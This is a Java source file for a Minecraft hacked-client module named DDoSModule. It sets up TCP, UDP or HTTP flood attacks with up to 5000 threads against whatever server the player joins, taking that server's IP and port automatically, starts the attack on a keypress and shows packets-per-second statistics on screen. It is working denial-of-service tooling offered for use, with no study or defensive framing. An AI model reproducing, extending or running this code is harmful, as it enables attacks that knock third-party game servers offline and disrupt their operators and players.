package com.lawab1ders.nan7i.kali.module.impl.other;

/*
 * Copyright (c) 2025 EldoDebug, Nan7i.南起
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
 * documentation files (the "Software"), to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
 * to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or substantial portions of
 * the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
 * THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
 * CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */

import com.lawab1ders.nan7i.kali.InstanceAccess;
import com.lawab1ders.nan7i.kali.events.JoinServerEvent;
import com.lawab1ders.nan7i.kali.events.KeyEvent;
import com.lawab1ders.nan7i.kali.events.OverlayRenderedEvent;
import com.lawab1ders.nan7i.kali.events.ticks.ClientTickedEvent;
import com.lawab1ders.nan7i.kali.language.TranslateComponent;
import com.lawab1ders.nan7i.kali.module.EModuleCategory;
import com.lawab1ders.nan7i.kali.module.HUDModule;
import com.lawab1ders.nan7i.kali.module.IModule;
import com.lawab1ders.nan7i.kali.module.impl.other.ddos.DDoSController;
import com.lawab1ders.nan7i.kali.module.setting.impl.EnumSetting;
import com.lawab1ders.nan7i.kali.module.setting.impl.IntSetting;
import com.lawab1ders.nan7i.kali.module.setting.impl.KeybindSetting;
import com.lawab1ders.nan7i.kali.module.setting.impl.TextSetting;
import com.lawab1ders.nan7i.kali.nanovg.Fonts;
import com.lawab1ders.nan7i.kali.notification.NotificationType;
import com.lawab1ders.nan7i.kali.utils.MillisTimer;
import lombok.val;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraftforge.client.event.GuiOpenEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.lwjgl.input.Keyboard;

import java.text.DecimalFormat;
import java.util.Locale;
import java.util.Random;

@IModule(
        name = "module.ddos",
        description = "module.ddos.desc",
        category = EModuleCategory.OTHER
)
public class DDoSModule extends HUDModule {

    public final KeybindSetting keybindSetting = new KeybindSetting(Keyboard.KEY_F6);
    public final EnumSetting protocolSetting = new EnumSetting(
            "module.ddos.opts.protocol",
            "module.ddos.opts.protocol.tcp",
            "module.ddos.opts.protocol.udp",
            "module.ddos.opts.protocol.http"
    );

    public final TextSetting ipSetting = new TextSetting("module.ddos.opts.ip", "127.0.0.1")
            .setChangeListener((oldValue, newValue) -> syncAddress(newValue));
    public final TextSetting portSetting = new TextSetting("module.ddos.opts.port", "25565");
    public final IntSetting threadCountSetting = new IntSetting("module.ddos.opts.threadcount", 1000, 1, 5000);
    public final IntSetting packetSizeSetting = new IntSetting("module.ddos.opts.packetsize", 1024, 0, 65507);
    public final IntSetting timeoutSetting = new IntSetting("module.opts.timeout", 14000, 0, 40000);
    public final IntSetting requestDelaySetting = new IntSetting("module.opts.requestdelay", 10, 10, 1000);
    public final IntSetting thresholdSetting = new IntSetting("module.opts.threshold", 10, 1, 500);

    private byte[] dataBytes = new byte[0];

    private float currentTime;
    private String address = "";

    private final MillisTimer timer = new MillisTimer();
    private final DecimalFormat timeFormat = new DecimalFormat("0.00");
    private int pressCount;

    private volatile Thread updateThread;

    @Override
    public void onDisable() {
        stopAttack(true);
    }

    @SubscribeEvent
    public void onGuiOpenEvent(GuiOpenEvent event) {
        if (event.gui instanceof GuiMainMenu) stopAttack(true);
    }

    @SubscribeEvent
    public void onClientTicked(ClientTickedEvent event) {
        switch (pressCount) {
            case 0:
                timer.reset();
                stopAttack(false);
                break;
            case 1:
                currentTime = (timer.getElapsedTime() / 1000F);
                break;
            case 3:
                stopAttack(true);
                break;
        }

        if (pressCount != 1) DDoSController.stopAttack();

        else if (DDoSController.failedCount > thresholdSetting.getValue()) {
            stopAttack(false);

            pressCount++;
            DDoSController.failedCount = 0;

            ntf.post(
                    getName(), TranslateComponent.i18n("module.ddos.noti.terminate"),
                    NotificationType.INFO
            );
        }
    }

    @SubscribeEvent
    public void onJoinServer(JoinServerEvent event) {
        val ipSettingText = ipSetting.getText();
        val portSettingText = portSetting.getText();

        if (ipSettingText.equals("127.0.0.1") || ipSettingText.isEmpty()) {
            ipSetting.setTextSilently(address = event.getAddress());
        }

        if (portSettingText.equals("25565") || portSettingText.isEmpty()) {
            portSetting.setTextSilently(String.valueOf(event.getPort()));
        }
    }

    @SubscribeEvent
    public void onOverlayRendered(OverlayRenderedEvent event) {
        nvg.setupAndDraw(this::drawNanoVG);
    }

    private void drawNanoVG() {
        String runningTimeInfo = "Running Time: " + timeFormat.format(currentTime) + " s";
        String addressInfo = "Address: " + (address.isEmpty() ? "127.0.0.1" : address);
        String attackCountInfo = "Attack Count: " + DDoSController.attackCount;
        String requestedInfo = "Requested: " + Math.round((double) DDoSController.attackCount / currentTime) + " P/s";
        String sentInfo = "Sent: ";

        switch (getAttackType(protocolSetting.getSelectedEntryKey())) {
            case 0:
                sentInfo
                        += (double) dataBytes.length / 1024.0D
                        * (double) Math.round((double) DDoSController.attackCount / currentTime) + " kB/s";

                break;
            case 1:
                sentInfo += String.format(
                        Locale.US, "%.2f", (double) dataBytes.length
                                / 1048576.0D * (double) Math.round((double) DDoSController.attackCount / currentTime)
                ) + " MB/s";
                break;
            case 2:
                byte[] getRequest = "GET / HTTP/1.1".getBytes();

                sentInfo
                        += (long) getRequest.length
                        * Math.round((double) DDoSController.attackCount / currentTime) + " B/s";

                break;
        }

        float runningTimeWidth = nvg.getTextWidth(runningTimeInfo, 9, Fonts.REGULAR);
        float addressWidth = nvg.getTextWidth(addressInfo, 9, Fonts.REGULAR);
        float attackCountWidth = nvg.getTextWidth(attackCountInfo, 9, Fonts.REGULAR);
        float requestedWidth = nvg.getTextWidth(requestedInfo, 9, Fonts.REGULAR);
        float sentWidth = nvg.getTextWidth(sentInfo, 9, Fonts.REGULAR);

        this.drawBackground(
                11 + Math.max(
                        runningTimeWidth,
                        Math.max(addressWidth, Math.max(attackCountWidth, Math.max(requestedWidth, sentWidth)))
                ), 9 * 5 + 11
        );

        this.drawText(runningTimeInfo, 5.5F, 5.5F, 9, Fonts.REGULAR);
        this.drawText(addressInfo, 5.5F, 15.5F, 9, Fonts.REGULAR);
        this.drawText(attackCountInfo, 5.5F, 25.5F, 9, Fonts.REGULAR);
        this.drawText(requestedInfo, 5.5F, 35.5F, 9, Fonts.REGULAR);
        this.drawText(sentInfo, 5.5F, 45.5F, 9, Fonts.REGULAR);
    }

    @SubscribeEvent
    public void onKey(KeyEvent event) {
        if (event.getKeyCode() == keybindSetting.getKeyCode()) {
            pressCount++;
        }

        if (pressCount == 1) {
            if (address.isEmpty() || address.equals("127.0.0.1")) {
                postNotificationOnlyOnce("misc.noti.fail.connect", NotificationType.ERROR);
                return;
            }

            try {
                String randomData = getRandomData();
                this.dataBytes = randomData.getBytes();

                DDoSController.startAttack(
                        address,
                        Integer.parseInt(portSetting.getText()),
                        getAttackType(protocolSetting.getSelectedEntryKey()),
                        timeoutSetting.getValue(),
                        threadCountSetting.getValue(),
                        randomData
                );

                setNotified(false);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void syncAddress(String newValue) {
        if (newValue.isEmpty()) return;
        if (updateThread != null) updateThread.interrupt();

        updateThread = new Thread(() -> {
            try {
                address = newValue.matches(".*[a-zA-Z].*") ? InstanceAccess.getAddress(newValue) : newValue;
                ntf.post(
                        getName(), TranslateComponent.i18n("module.ddos.noti.lock") + " " + address,
                        NotificationType.SUCCESS
                );
            } catch (Exception e) {
                address = "";
                ntf.post(
                        getName(), TranslateComponent.i18n("module.ddos.noti.fail.lock") + " " + newValue,
                        NotificationType.ERROR
                );
            }

            ipSetting.setTextSilently(address);
        });

        updateThread.start();
    }

    private String getRandomData() {
        Random random = new Random();
        String randomData = "";

        for (int i = 0; i < packetSizeSetting.getValue(); i++) {
            int randomCharIndex = random.nextInt(62);
            randomData = randomData.concat((new String[] {
                    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n",
                    "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B",
                    "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P",
                    "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4",
                    "5", "6", "7", "8", "9", "0"
            })[randomCharIndex]);
        }

        return randomData;
    }

    private int getAttackType(String t) {
        switch (t) {
            case "module.ddos.opts.protocol.udp":
                return 1;
            case "module.ddos.opts.protocol.http":
                return 2;
            default:
                return 0;
        }
    }

    private void stopAttack(boolean reset) {
        DDoSController.stopAttack();

        if (reset) {
            currentTime = pressCount = DDoSController.attackCount = 0;
            timer.reset();
        }
    }
}
